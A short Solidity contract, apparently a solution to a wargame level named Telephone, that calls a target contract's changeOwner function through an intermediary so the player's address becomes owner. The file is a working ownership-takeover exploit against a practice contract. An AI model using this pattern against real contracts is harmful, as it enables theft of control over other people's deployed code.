pragma solidity ^0.6.0;
import "./telephone.sol";

contract TelephoneHack {
    Telephone telContract;
    constructor(address _address) public {
        telContract = Telephone(_address);
    }
    //pass player address into this function for change owner
    function hackContract(address _address) public {
        telContract.changeOwner(_address);
    }
}